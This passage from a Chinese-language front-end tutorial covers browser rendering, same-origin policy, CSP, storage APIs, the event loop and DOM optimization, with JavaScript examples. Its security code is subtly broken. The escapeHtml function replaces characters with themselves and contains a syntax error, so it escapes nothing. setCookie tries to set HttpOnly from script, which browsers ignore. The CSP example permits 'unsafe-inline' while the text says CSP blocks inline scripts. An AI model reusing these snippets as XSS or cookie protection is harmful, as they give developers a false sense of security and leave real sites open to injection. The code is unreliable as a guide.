- **减少 CSS 渐变和阴影**：复杂的CSS渐变、阴影效果会增加绘制时间，应合理使用，避免过度使用，在性能敏感的场景使用简单样式替代
- **优化选择器性能**：避免使用通配符选择器、嵌套层级过深的选择器，选择器越简单性能越好，浏览器从右向左匹配选择器，应减少匹配次数

**利用合成层：**
- **使用 transform: translateZ(0) 创建合成层**：通过CSS transform属性创建独立的合成层，将元素提升到独立的图层，避免影响其他元素的渲染，提高动画性能
- **使用 will-change 提示浏览器**：will-change属性可以提前告知浏览器元素将要发生变化，浏览器会为该元素创建独立的图层并优化渲染，但不要过度使用
- **适合动画元素**：对于需要频繁动画的元素，如轮播图、滚动动画、3D变换等，创建合成层可以避免回流和重绘，实现流畅的60fps动画效果
- **减少重绘范围**：合成层的元素变化只会影响该图层，不会触发其他图层的重绘，通过合理使用合成层可以大幅减少重绘范围，提高渲染性能

### 🔒 浏览器安全

**同源策略：**
- **限制不同源之间的交互**：同源策略是浏览器的核心安全机制，它限制了一个源的文档或脚本如何与另一个源的资源进行交互，防止恶意网站读取其他网站的数据
- **源：协议、域名、端口**：源由协议（http/https）、域名（example.com）和端口（80/443）三部分组成，只有三者完全相同才是同源，任何一个不同都是跨域
- **保护用户数据安全**：同源策略防止恶意网站通过脚本访问其他网站的敏感数据，如Cookie、localStorage、DOM等，是Web安全的基础

**沙箱机制：**
- **隔离不同网站的进程**：浏览器使用沙箱技术将不同网站的渲染进程相互隔离，每个标签页或iframe运行在独立的沙箱环境中，限制其访问系统资源的能力
- **防止恶意代码影响其他网站**：沙箱机制限制了渲染进程的权限，如无法访问文件系统、无法访问其他进程的内存、无法执行系统命令等，防止恶意代码扩散
- **提高浏览器稳定性**：即使某个网站的代码存在漏洞或恶意行为，沙箱机制也能将其限制在当前进程中，不会影响其他标签页或浏览器本身的稳定性

### 💻 代码示例：安全最佳实践

\`\`\`javascript
// CSP 内容安全策略示例
// 在服务器响应头中设置
// Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';

// 防止XSS攻击的安全函数
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&")
    .replace(/</g, "<")
    .replace(/>/g, ">")
    .replace(/"/g, """)
    .replace(/'/g, "&#039;");
}

// 安全的DOM操作
function safeUpdateContent(elementId, userContent) {
  const element = document.getElementById(elementId);
  // 使用textContent而不是innerHTML防止XSS
  element.textContent = userContent;
}

// 跨域安全通信
// 在iframe中安全通信
const iframe = document.getElementById('myFrame');
iframe.contentWindow.postMessage('Hello from parent', 'https://trusted-domain.com');

// 监听消息并验证来源
window.addEventListener('message', (event) => {
  // 验证消息来源
  if (event.origin !== 'https://trusted-domain.com') {
    return;
  }
  
  console.log('收到安全消息:', event.data);
});
\`\`\`

**内容安全策略 (CSP)：**
- **限制资源加载来源**：CSP通过HTTP头或meta标签指定允许加载的资源来源，如脚本、样式、图片、字体等，防止加载来自恶意域名的资源
- **防止 XSS 攻击**：CSP禁止内联脚本和eval等危险函数，即使攻击者注入了恶意脚本，也无法执行，有效防御XSS攻击
- **提高网站安全性**：CSP是深度防御策略的重要组成部分，配合其他安全措施如HTTPS、HttpOnly Cookie等，可以显著提高网站的整体安全性

### 💾 浏览器存储

**Cookie：**
- **小型文本文件**：Cookie是浏览器存储在用户设备上的小型文本文件，由服务器通过Set-Cookie响应头设置，浏览器会在后续请求中自动携带Cookie
- **存储用户信息**：Cookie常用于存储用户会话信息、登录状态、用户偏好等，实现用户身份识别和状态保持功能
- **随请求发送**：浏览器会在每次HTTP请求中自动携带匹配的Cookie，这会增加请求大小，应合理设置Cookie的使用范围
- **大小限制约 4KB**：单个Cookie的大小限制约为4KB，每个域名下的Cookie数量也有限制（通常为20-50个），不适合存储大量数据

**localStorage：**
- **持久存储**：localStorage提供持久化的本地存储，数据存储在用户设备上，除非手动清除或通过代码删除，否则数据会一直保留，不会随浏览器关闭而丢失
- **容量约 5MB**：localStorage的存储容量通常为5MB左右，比Cookie大得多，适合存储较多数据，但仍不适合存储大量数据或敏感信息
- **同源策略**：localStorage遵循同源策略，只有相同协议、域名和端口的页面才能访问相同的localStorage数据，不同源之间数据隔离
- **适合存储用户偏好**：localStorage适合存储用户的偏好设置、主题配置、语言选择等非敏感数据，实现个性化体验

**sessionStorage：**
- **会话存储**：sessionStorage提供会话级别的本地存储，数据只在当前浏览器窗口或标签页中有效，当窗口或标签页关闭时，数据会被自动清除
- **容量约 5MB**：sessionStorage的存储容量通常为5MB左右，与localStorage相同，适合存储会话期间的临时数据，不会占用过多存储空间
- **会话结束后清除**：当用户关闭浏览器窗口或标签页时，sessionStorage中的数据会被自动清除，适合存储不需要持久化的临时数据
- **适合临时数据**：sessionStorage适合存储表单数据、临时状态、页面间传递的参数等会话期间的临时数据，实现页面间的数据共享

**IndexedDB：**
- **大型存储**：IndexedDB是浏览器提供的NoSQL数据库，支持存储大量结构化数据，包括对象、数组等复杂类型，存储容量远大于localStorage和sessionStorage
- **容量较大**：IndexedDB的存储容量通常为磁盘可用空间的一定比例（如50%），可以存储数百MB甚至GB级别的数据，适合离线应用和大型数据缓存
- **异步 API**：IndexedDB使用异步API进行数据操作，不会阻塞主线程，支持事务、索引、游标等高级数据库功能，适合处理复杂数据操作
- **适合复杂数据**：IndexedDB适合存储离线数据、大量用户数据、复杂的数据结构，如邮件客户端、笔记应用、离线文档编辑器等需要大量本地存储的应用

### 💻 代码示例：浏览器存储操作

\`\`\`javascript
// Cookie 操作
function setCookie(name, value, days) {
  const expires = new Date();
  expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
  document.cookie = \`\${name}=\${value};expires=\${expires.toUTCString()};path=/;Secure;HttpOnly\`;
}

function getCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(';');
  for(let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

// localStorage 操作
function saveToLocalStorage(key, data) {
  try {
    localStorage.setItem(key, JSON.stringify(data));
  } catch (e) {
    console.error('localStorage 存储失败:', e);
  }
}

function getFromLocalStorage(key) {
  try {
    const data = localStorage.getItem(key);
    return data ? JSON.parse(data) : null;
  } catch (e) {
    console.error('localStorage 读取失败:', e);
    return null;
  }
}

// IndexedDB 操作示例
class IndexedDBHelper {
  constructor(dbName, version) {
    this.dbName = dbName;
    this.version = version;
    this.db = null;
  }

  async open() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, this.version);
      
      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };
      
      request.onupgradeneeded = (event) => {
        const db = event.target.result;
        if (!db.objectStoreNames.contains('users')) {
          db.createObjectStore('users', { keyPath: 'id' });
        }
      };
    });
  }

  async add(storeName, data) {
    const transaction = this.db.transaction([storeName], 'readwrite');
    const store = transaction.objectStore(storeName);
    return store.add(data);
  }

  async get(storeName, id) {
    const transaction = this.db.transaction([storeName], 'readonly');
    const store = transaction.objectStore(storeName);
    return store.get(id);
  }
}

// 使用示例
const dbHelper = new IndexedDBHelper('myDatabase', 1);
await dbHelper.open();
await dbHelper.add('users', { id: 1, name: '张三', email: 'zhangsan@example.com' });
\`\`\`

### 🌐 网络请求

**HTTP 协议：**
- **HTTP/1.1：持久连接**：HTTP/1.1默认启用持久连接（Keep-Alive），允许多个请求复用同一个TCP连接，减少连接建立和关闭的开销，提高性能
- **HTTP/2：多路复用**：HTTP/2支持多路复用，在一个TCP连接上可以同时发送多个请求和响应，解决了HTTP/1.1的队头阻塞问题，大幅提高性能
- **HTTP/3：基于 QUIC**：HTTP/3基于QUIC协议，使用UDP代替TCP，实现更快的连接建立、更好的拥塞控制和更强的可靠性，是HTTP协议的未来
- **HTTPS：加密传输**：HTTPS通过TLS/SSL协议加密HTTP通信，保护数据传输安全，防止中间人攻击和数据窃听，是现代Web的标准配置

**缓存策略：**
- **强缓存：Cache-Control, Expires**：强缓存通过Cache-Control和Expires响应头设置，浏览器直接使用本地缓存而不发送请求，减少网络传输，提高加载速度
- **协商缓存：ETag, Last-Modified**：协商缓存通过ETag和Last-Modified响应头验证资源是否更新，浏览器发送请求验证，服务器返回304表示使用缓存，减少传输数据量
- **缓存位置：Memory Cache, Disk Cache**：浏览器缓存分为内存缓存（Memory Cache）和磁盘缓存（Disk Cache），内存缓存速度快但容量小，磁盘缓存容量大但速度较慢

**资源加载：**
- **预加载：preload**：preload用于预加载关键资源，如字体、关键CSS、关键JavaScript等，浏览器会提前加载这些资源，减少首屏渲染时间，提高用户体验
- **预连接：preconnect**：preconnect用于提前建立与目标服务器的连接，包括DNS解析、TCP连接、TLS握手，减少后续请求的延迟，适合连接到CDN或API服务器
- 预解析：dns-prefetch：dns-prefetch用于提前解析域名，减少DNS解析时间，适合连接到第三方域名，如CDN、API服务器、广告平台等
- 预获取：prefetch：prefetch用于预获取未来可能需要的资源，如下一页的资源，浏览器会在空闲时加载这些资源，提高后续页面的加载速度

### 浏览器事件循环

**事件循环：**
- **处理异步操作**：事件循环是JavaScript处理异步操作的核心机制，通过任务队列管理异步任务的执行顺序，确保异步操作按正确顺序执行
- **任务队列：宏任务和微任务**：任务队列分为宏任务队列和微任务队列，宏任务包括setTimeout、setInterval、I/O等，微任务包括Promise.then、MutationObserver等
- **执行顺序：微任务 → 宏任务**：事件循环的执行顺序是先执行同步代码，然后执行微任务队列中的所有任务，最后执行宏任务队列中的一个任务，循环往复
- **事件处理机制**：事件循环机制确保用户交互事件、网络请求、定时器等异步操作能够正确执行，同时保持页面的响应性

**宏任务：**
- **setTimeout**：setTimeout用于延迟执行代码，将回调函数添加到宏任务队列，在指定的延迟时间后执行，是最常用的定时器API
- **setInterval**：setInterval用于重复执行代码，将回调函数添加到宏任务队列，按照指定的时间间隔重复执行，适合周期性任务
- **I/O 操作**：文件读写、数据库操作等I/O操作是异步的，当操作完成时将回调函数添加到宏任务队列，不阻塞主线程
- **网络请求**：fetch、XMLHttpRequest等网络请求是异步的，当请求完成时将回调函数添加到宏任务队列，实现异步数据获取

**微任务：**
- **Promise.then()**：Promise.then()的回调函数会被添加到微任务队列，在当前宏任务执行完毕后立即执行，优先级高于宏任务
- **async/await**：async/await是Promise的语法糖，await后面的代码会被添加到微任务队列，实现同步风格的异步编程
- **MutationObserver**：MutationObserver用于监听DOM变化，当DOM发生变化时将回调函数添加到微任务队列，实现响应式DOM更新
- **process.nextTick**：process.nextTick是Node.js特有的微任务，优先级高于Promise.then()，在当前操作完成后立即执行

### 💻 代码示例：事件循环演示

\`\`\`javascript
// 事件循环执行顺序演示
console.log('1. 同步代码');

setTimeout(() => {
  console.log('4. 宏任务 - setTimeout');
}, 0);

Promise.resolve().then(() => {
  console.log('3. 微任务 - Promise');
});

console.log('2. 同步代码结束');

// 输出顺序：
// 1. 同步代码
// 2. 同步代码结束
// 3. 微任务 - Promise
// 4. 宏任务 - setTimeout

// 复杂事件循环示例
console.log('开始');

setTimeout(() => console.log('setTimeout 1'), 0);

Promise.resolve().then(() => {
  console.log('Promise 1');
  return Promise.resolve();
}).then(() => {
  console.log('Promise 2');
});

setTimeout(() => console.log('setTimeout 2'), 0);

console.log('结束');

// 输出顺序：
// 开始
// 结束
// Promise 1
// Promise 2
// setTimeout 1
// setTimeout 2
\`\`\`

### 🎯 最佳实践

**性能优化：**
- **减少 DOM 操作**：DOM操作是昂贵的，应尽量减少DOM操作次数，使用DocumentFragment批量操作、虚拟DOM等技术优化DOM操作性能
- **优化 CSS 选择器**：避免使用通配符选择器、嵌套层级过深的选择器，选择器越简单性能越好，浏览器从右向左匹配选择器
- **使用 requestAnimationFrame 处理动画**：requestAnimationFrame在浏览器重绘之前调用回调函数，确保动画流畅，避免使用setTimeout处理动画
- **合理使用 Web Workers**：将耗时计算任务放到Web Workers中执行，避免阻塞主线程，保持页面响应性

**安全实践：**
- **实施 CSP**：配置内容安全策略（CSP），限制资源加载来源，禁止内联脚本和eval，防止XSS攻击，提高网站安全性
- **避免 XSS 漏洞**：对用户输入进行转义和过滤，避免直接将用户输入插入到HTML中，使用textContent代替innerHTML，防止XSS攻击
- **防止 CSRF 攻击**：使用CSRF Token验证、SameSite Cookie属性、检查Referer头等方式，防止跨站请求伪造攻击
- **安全存储用户数据**：避免在前端存储敏感数据，如密码、Token等，必须存储时应加密处理，使用HttpOnly Cookie存储会话信息

**开发工具：**
- **Chrome DevTools**：Chrome浏览器内置的开发者工具，是前端开发最常用的调试和性能分析工具，提供Elements面板（检查和编辑DOM元素和CSS样式）、Console面板（查看日志和执行JavaScript）、Network面板（监控网络请求）、Performance面板（分析页面性能）、Memory面板（分析内存使用和检测内存泄漏）、Application面板（检查Storage、Cookie、Service Worker等应用数据）等，是前端开发必备的工具
- **Firefox Developer Tools**：Firefox浏览器内置的开发者工具，提供与Chrome DevTools类似的功能，包括Inspector、Console、Network、Performance、Memory等面板，还有一些特色功能如CSS变量检查器、响应式设计模式、可访问性检查器等，Firefox的开发者工具在CSS调试方面有一些独特的优势
- **Edge DevTools**：Microsoft Edge浏览器内置的开发者工具，基于Chromium内核，功能与Chrome DevTools非常相似，由于Edge是Windows系统的默认浏览器，在Windows平台上有一些原生集成优势，还提供一些独特功能如3D视图工具（查看页面的DOM层级）、CSS镜像编辑（实时预览CSS更改）等
- **Safari Developer Tools**：Safari浏览器内置的开发者工具，是开发和调试Safari及iOS Web应用的重要工具，提供Elements、Console、Network、Timeline等面板，Safari开发者工具在调试iOS设备上的网页时非常有用，可以通过Web Inspector连接iPhone或iPad进行真机调试，对于需要兼容Safari的项目是必备工具

### 📚 学习资源

**浏览器内部原理：**
- **How Browsers Work**：详细介绍浏览器工作原理的经典文章，涵盖HTML解析、CSS解析、渲染树构建、布局、绘制等完整流程，是学习浏览器原理的必读材料
- **Inside look at modern web browser**：Google Chrome团队发布的系列文章，深入介绍Chrome浏览器的多进程架构、站点隔离、渲染流程等内部原理
- **MDN Web Docs**：Mozilla维护的Web技术文档，提供HTML、CSS、JavaScript、DOM、Web API等技术的详细文档和教程，是前端开发的权威参考
- **Google Web Fundamentals**：Google提供的Web开发最佳实践指南，涵盖性能优化、安全、用户体验等主题，帮助开发者构建高质量的Web应用

**性能优化指南：**
- **Web Vitals**：Google推出的核心Web指标，包括LCP（最大内容绘制）、FID（首次输入延迟）、CLS（累积布局偏移），用于衡量和优化用户体验
- **Lighthouse**：Google开源的自动化工具，用于审计Web应用的性能、可访问性、最佳实践、SEO等，提供优化建议和评分报告
- Performance API：浏览器提供的性能监控API，包括Performance Timeline、Navigation Timing、Resource Timing等，用于测量和分析页面性能
- Core Web Vitals：Google定义的核心Web指标，包括LCP、FID、CLS，是影响用户体验的关键指标，也是Google搜索排名的重要因素`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"dom-optimization",title:"DOM 操作与优化",category:"browser",difficulty:"medium",tags:["浏览器原理","DOM","DOM 操作","性能优化"],content:`## DOM 操作与优化

DOM (Document Object Model) 是浏览器对 HTML 文档的结构化表示，DOM 操作是前端开发中最常见的操作之一，也是性能瓶颈的主要来源。

### 🌳 DOM 树结构

**DOM 节点类型：**
- **Element**：元素节点，表示HTML或XML文档中的元素，如div、span、p等，是DOM树中最常见的节点类型，可以通过document.createElement创建
- **Text**：文本节点，表示元素或属性中的文本内容，是DOM树的叶子节点，可以通过document.createTextNode创建
- **Comment**：注释节点，表示HTML或XML文档中的注释，不会显示在页面上，但可以通过DOM API访问和操作
- **Document**：文档节点，表示整个HTML或XML文档，是DOM树的根节点，可以通过document对象访问，提供创建其他节点的方法
- **DocumentFragment**：文档片段节点，轻量级的文档对象，用于在内存中存储节点，可以一次性插入到文档中，减少DOM操作次数

**DOM 树遍历：**
- **遍历方法**：childNodes, children, firstChild, lastChild, nextSibling, previousSibling：这些方法用于遍历DOM树，childNodes返回所有子节点，children只返回元素节点，其他方法用于获取相邻节点
- **遍历性能：避免深度遍历**：深度遍历大型DOM树会影响性能，应尽量减少遍历深度和次数，使用更具体的选择器或缓存节点引用优化性能
- **遍历优化：缓存节点引用**：在循环中频繁访问DOM节点时，应将节点引用缓存到变量中，避免重复查询DOM树，提高性能

**DOM 操作 API：**
- **创建节点**：createElement, createTextNode, createDocumentFragment：createElement创建元素节点，createTextNode创建文本节点，createDocumentFragment创建文档片段，用于批量操作DOM
- **添加节点**：appendChild, insertBefore：appendChild将节点添加到父节点的子节点列表末尾，insertBefore将节点插入到指定节点之前，是添加节点的两种主要方法
- **删除节点**：removeChild：removeChild从DOM树中删除指定节点，返回被删除的节点，删除前应确保节点存在，避免报错
- **修改节点**：innerHTML, textContent：innerHTML设置或获取元素的HTML内容，textContent设置或获取元素的文本内容，textContent性能更好且更安全

### ⚡ DOM 操作性能

**性能瓶颈：**
- **DOM 操作是昂贵的**：DOM操作涉及浏览器的重排和重绘，每次操作都需要浏览器重新计算布局和绘制页面，是前端性能的主要瓶颈
- **每次操作都可能触发重排和重绘**：修改元素的位置、大小、样式等都会触发浏览器的重排和重绘，频繁操作会导致性能下降
- **频繁操作会导致性能下降**：在循环中频繁操作DOM会导致大量重排和重绘，应批量处理DOM操作，减少操作次数
- **影响用户体验**：DOM操作性能问题会导致页面卡顿、响应缓慢，影响用户体验，应优化DOM操作提高页面性能

**重排与重绘：**
- **重排 (Reflow)**：计算元素位置和大小：当元素的几何属性（位置、大小）发生变化时，浏览器需要重新计算元素的位置和大小，这个过程称为重排，是性能消耗较大的操作
- **重绘 (Repaint)**：绘制元素视觉效果：当元素的视觉属性（颜色、背景、边框）发生变化但不影响布局时，浏览器需要重新绘制元素的视觉效果，这个过程称为重绘
- **重排会导致重绘**：重排必然导致重绘，因为元素的位置和大小变化后需要重新绘制，但重绘不一定导致重排
- **重绘不一定导致重排**：只改变元素的颜色、背景等视觉属性不会影响布局，只触发重绘不触发重排，性能消耗小于重排

**操作成本：**
- **读取布局属性：触发重排**：读取offsetTop、offsetLeft、offsetWidth、offsetHeight、scrollTop、scrollLeft、clientTop、clientLeft、clientWidth、clientHeight等属性会强制浏览器同步计算布局，触发重排
- **修改样式：可能触发重排或重绘**：修改元素的样式属性，如width、height、margin、padding等会触发重排，修改color、background等只会触发重绘
- **添加/删除元素：触发重排**：添加或删除DOM元素会改变DOM树结构，导致浏览器重新计算布局，触发重排
- **改变元素大小/位置：触发重排**：改变元素的width、height、margin、padding、position等属性会影响布局，触发重排

### 🚀 DOM 操作优化策略

**批量操作：**
- **使用 DocumentFragment**：DocumentFragment是轻量级的文档对象，可以在内存中构建DOM片段，然后一次性插入到文档中，减少DOM操作次数，提高性能
- **批量修改样式**：通过修改元素的class或使用cssText一次性修改多个样式属性，避免多次触发重排，减少性能消耗
- **批量添加/删除元素**：在内存中构建完整的DOM结构，然后一次性插入到文档中，避免多次操作DOM导致的多次重排
- **减少操作次数**：将多个DOM操作合并为一次操作，减少重排和重绘次数，提高页面性能

**缓存 DOM 引用：**
- **缓存频繁访问的节点**：对于需要频繁访问的DOM节点，应将其引用存储在变量中，避免重复查询DOM树，提高性能
- **避免重复查询**：每次使用document.getElementById、document.querySelector等方法查询DOM都会遍历DOM树，应缓存查询结果
- **使用变量存储节点引用**：将DOM节点引用存储在变量中，后续操作直接使用变量，避免重复查询DOM，提高代码执行效率
- **减少 DOM 遍历**：缓存节点引用可以减少DOM遍历次数，特别是在循环中操作DOM时，应先缓存节点引用再进行操作

**避免频繁读取布局属性：**
- **缓存布局属性值**：将offsetTop、offsetLeft、offsetWidth、offsetHeight等布局属性值缓存到变量中，避免重复读取触发重排
- **避免在循环中读取**：在循环中频繁读取布局属性会导致大量重排，应先读取并缓存属性值，然后在循环中使用缓存值
- **一次性读取多个属性**：如果需要读取多个布局属性，应一次性读取所有属性，避免多次读取触发多次重排
- **减少重排触发**：合理组织代码，避免在修改样式后立即读取布局属性，减少不必要的重排

**使用事件委托：**
- **减少事件监听器数量**：事件委托将事件监听器添加到父元素，而不是每个子元素，大幅减少事件监听器数量，提高性能
- **提高性能**：事件委托利用事件冒泡机制，只需一个事件监听器就能处理多个子元素的事件，减少内存占用和事件绑定开销
- **简化代码**：事件委托避免了为每个子元素单独绑定事件监听器的繁琐代码，代码更简洁，更易维护
- **支持动态添加的元素**：事件委托可以处理动态添加的子元素事件，无需为新增元素重新绑定事件监听器

### 💻 代码示例：DOM 操作优化

\`\`\`javascript
// 批量DOM操作优化
function optimizedDOMOperations() {
  // ❌ 不好的做法：多次操作DOM
  for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    div.textContent = \`Item \${i}\`;
    document.body.appendChild(div); // 每次都触发重排
  }

  // ✅ 好的做法：使用DocumentFragment
  const fragment = document.createDocumentFragment();
  for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    div.textContent = \`Item \${i}\`;
    fragment.appendChild(div);
  }
  document.body.appendChild(fragment); // 只触发一次重排
}

// 缓存DOM引用
function cacheDOMReferences() {
  // ❌ 不好的做法：重复查询DOM
  function updateElement() {
    document.getElementById('myElement').style.color = 'red';
    document.getElementById('myElement').style.fontSize = '16px';
    document.getElementById('myElement').style.backgroundColor = 'blue';
  }

  // ✅ 好的做法：缓存DOM引用
  const element = document.getElementById('myElement');
  function updateElementOptimized() {
    element.style.color = 'red';
    element.style.fontSize = '16px';
    element.style.backgroundColor = 'blue';
  }
}

// 事件委托示例
function eventDelegation() {
  // ❌ 不好的做法：为每个按钮添加事件监听器
  const buttons = document.querySelectorAll('.button');
  buttons.forEach(button => {
    button.addEventListener('click', function() {
      console.log('按钮被点击:', this.textContent);
    });
  });

  // ✅ 好的做法：使用事件委托
  document.addEventListener('click', function(event) {
    if (event.target.classList.contains('button')) {
      console.log('按钮被点击:', event.target.textContent);
    }
  });
}

// 批量样式修改
function batchStyleUpdates() {
  const element = document.getElementById('myElement');
  
  // ❌ 不好的做法：多次修改样式
  element.style.width = '100px';
  element.style.height = '100px';
  element.style.backgroundColor = 'red';
  element.style.color = 'white';

  // ✅ 好的做法：批量修改样式
  element.style.cssText = 'width: 100px; height: 100px; background-color: red; color: white;';
  
  // 或者使用CSS类
  element.className = 'highlighted';
}
\`\`\`

### 🔄 虚拟 DOM

**虚拟 DOM 概念：**
- **轻量级的 DOM 描述对象**：虚拟DOM是用JavaScript对象描述真实DOM结构的轻量级表示，包含元素类型、属性、子节点等信息，不包含DOM的重量级特性
- **减少直接 DOM 操作**：虚拟DOM通过比较新旧虚拟DOM树的差异，批量更新真实DOM，减少直接DOM操作次数，提高性能
- **提高渲染性能**：虚拟DOM将多次DOM更新合并为一次，减少重排和重绘次数，提高渲染性能，特别是在频繁更新场景下
- **框架如 React、Vue 使用**：React、Vue等现代前端框架都使用虚拟DOM技术，通过虚拟DOM实现高效的视图更新

**虚拟 DOM 工作原理：**
- **创建虚拟 DOM 树**：根据组件的render方法或模板创建虚拟DOM树，虚拟DOM树是真实DOM的JavaScript对象表示
- **计算差异 (Diff)**：比较新旧虚拟DOM树的差异，找出需要更新的节点，Diff算法通过同层比较、key属性优化等方式提高效率
- **批量更新真实 DOM**：将所有差异一次性应用到真实DOM上，减少DOM操作次数，避免频繁重排和重绘，提高性能
- **减少重排和重绘**：通过批量更新DOM，虚拟DOM技术可以最小化重排和重绘次数，提高页面渲染性能

**Diff 算法：**
- **同层比较**：Diff算法只比较同一层级的节点，不跨层级比较，大大减少了比较次数，提高了算法效率，时间复杂度从O(n^3)降低到O(n)
- **标签不同直接替换**：如果新旧节点的标签类型不同，直接删除旧节点并创建新节点，不再比较子节点，简化了比较过程
- **标签相同比较属性和子节点**：如果新旧节点的标签类型相同，比较节点的属性和子节点，更新变化的属性，递归比较子节点
- **key 属性优化**：通过key属性标识节点，在列表渲染时可以准确识别哪些节点发生了变化，避免不必要的DOM操作，提高更新效率

### 🎯 DOM 事件

**事件流：**
- **捕获阶段**：从根节点到目标节点：事件从document对象开始，沿着DOM树向下传播到目标元素，依次触发各元素的捕获事件监听器
- **目标阶段**：在目标节点上触发：事件到达目标元素后，在目标元素上触发事件，如果事件类型没有冒泡，事件到此结束
- **冒泡阶段**：从目标节点到根节点：事件从目标元素开始，沿着DOM树向上传播到document对象，依次触发各元素的冒泡事件监听器

**事件委托：**
- **将事件监听器添加到父元素**：事件委托是一种事件处理模式，将事件监听器添加到父元素而不是每个子元素，利用事件冒泡机制处理子元素事件
- **利用事件冒泡**：当子元素触发事件时，事件会冒泡到父元素，父元素的事件监听器可以通过event.target判断是哪个子元素触发了事件
- **减少事件监听器数量**：事件委托可以大幅减少事件监听器数量，特别是对于大量子元素的场景，提高性能和内存效率
- **支持动态元素**：事件委托可以处理动态添加的子元素事件，无需为新增元素重新绑定事件监听器，简化了代码

**事件处理优化：**
- **避免在事件处理函数中执行耗时操作**：事件处理函数应尽快执行完毕，避免阻塞主线程，耗时操作应使用Web Workers或requestIdleCallback
- **使用 passive 事件监听器**：对于touch、wheel等事件，使用passive: true选项声明不会调用preventDefault()，提高滚动性能
- **及时移除事件监听器**：在组件卸载或不需要时及时移除事件监听器，避免内存泄漏和不必要的事件处理
- **避免内存泄漏**：事件监听器会持有对元素的引用，如果不及时移除，会导致元素无法被垃圾回收，造成内存泄漏

### ⚡ DOM API 优化

**选择器 API：**
- querySelector：返回第一个匹配元素：querySelector使用CSS选择器查询DOM，返回第一个匹配的元素，如果找不到则返回null，是现代DOM查询的推荐方法
- querySelectorAll：返回所有匹配元素：querySelectorAll返回所有匹配元素的NodeList，不是实时的，适合一次性查询多个元素
- getElementById：通过 ID 获取元素：getElementById通过元素ID获取元素，是最快的DOM查询方法，性能优于querySelector
- getElementsByClassName：通过类名获取元素：getElementsByClassName返回具有指定类名的所有元素的HTMLCollection，是实时的，性能优于querySelectorAll

**性能比较：**
- getElementById > querySelector > getElementsByClassName > querySelectorAll：这是选择器API的性能排序，getElementById是最快的，因为它直接通过ID查找元素，不需要遍历DOM树，querySelector使用CSS选择器查询，性能取决于选择器的复杂度，getElementsByClassName返回HTMLCollection是实时的，querySelectorAll返回NodeList不是实时的
- 选择器越具体性能越好：具体的选择器如ID选择器(#element)和类选择器(.class)比通配符选择器(*)性能好很多，因为浏览器可以快速定位元素，而不需要遍历所有元素，选择器匹配是从右向左进行的
- 避免复杂选择器：复杂的选择器如嵌套选择器、属性选择器会增加匹配时间，应该尽量简化选择器，使用更直接的方式选择元素，或者预先给元素添加特定的class
- 缓存选择结果：将选择器结果缓存到变量中，避免重复查询DOM树，特别是在循环中操作DOM时，应该先缓存节点引用再进行操作，提高代码执行效率

**操作 API：**
- innerHTML vs createElement：innerHTML用于设置或获取元素的HTML内容，优点是简洁方便，可以一次性插入大量HTML，缺点是可能存在XSS安全风险，且性能在大量DOM操作时较差；createElement逐个创建元素，优点是更安全（不会解析恶意HTML）、性能更好（可以批量操作），缺点是代码更繁琐，需要逐个创建和追加元素
- textContent vs innerText：textContent获取或设置元素的所有文本内容，包括子元素的文本，性能更好因为不会触发回流（不计算布局）；innerText获取或设置元素的可见文本内容，会受到CSS样式影响（隐藏的文本不会获取），会触发回流以计算布局，因此性能较差，在不需要考虑CSS样式影响时应优先使用textContent
- appendChild vs insertBefore：appendChild将节点添加到父节点的子节点列表末尾，是最常用的添加节点方法；insertBefore将节点插入到指定节点之前，可以用于在列表开头插入元素，实现类似unshift的功能，如果要在末尾插入，insertBefore配合null参数等同于appendChild
- removeChild vs innerHTML：removeChild从DOM树中删除指定节点，返回被删除的节点，可以精确删除单个元素；innerHTML设置为空字符串可以删除元素的所有子节点，但会销毁所有子节点的事件监听器，可能导致内存泄漏，如果只需要删除子元素且不需要保留事件监听器，innerHTML = ''更简洁

### 最佳实践

**DOM 操作：**
- 减少 DOM 操作次数：DOM操作是前端性能的主要瓶颈之一，每次DOM操作都可能触发浏览器的重排和重绘，应该尽量减少DOM操作次数，可以使用DocumentFragment批量添加元素、使用虚拟DOM技术如React/Vue框架、将多次操作合并为一次等方式来优化
- 批量处理 DOM 更新：在需要更新多个DOM元素时，应该先将所有更新准备好，然后一次性应用到DOM上，避免多次触发重排和重绘，例如使用requestAnimationFrame在下一帧统一更新，或者使用文档片段(DocumentFragment)在内存中构建完整的DOM结构后一次性插入
- 缓存 DOM 引用：对于需要频繁访问的DOM节点，应该将其引用缓存到变量中，避免重复查询DOM树，特别是循环中需要多次访问同一个元素时，缓存引用可以显著提高性能，常见的缓存模式是在初始化时获取一次引用，后续直接使用变量
- 使用 DocumentFragment：DocumentFragment是轻量级的文档对象，相当于一个容器，可以在其中构建完整的DOM结构，然后一次性将所有子节点添加到实际的DOM树中，只会触发一次重排和重绘，比逐个添加元素性能好很多，是批量操作DOM的最佳实践

**样式操作：**
- 批量修改样式：当需要修改多个样式属性时，应该尽量一次性修改完成，可以通过修改元素的className来应用多个样式，而不是逐个设置style属性，这样可以让浏览器只触发一次重排和重绘，另外使用cssText属性也可以一次性设置多个样式，但会覆盖原有的内联样式，需要注意
- 使用 CSS 类代替内联样式：将需要应用的样式预先定义在CSS类中，然后通过JavaScript切换className来应用样式，这样做的好处是样式与JavaScript代码分离，代码更清晰，维护更方便，而且浏览器的CSS解析和渲染引擎对类选择器的处理更高效，内联样式每次修改都会触发重排
- 避免频繁修改样式：样式修改是触发重排和重绘的主要原因，应该避免在循环中频繁修改样式，或者先将元素隐藏（display:none）修改样式后再显示，或者使用CSS动画代替JavaScript动画，或者使用transform和opacity属性，因为这两个属性的变化不会触发布局变化，只会触发合成
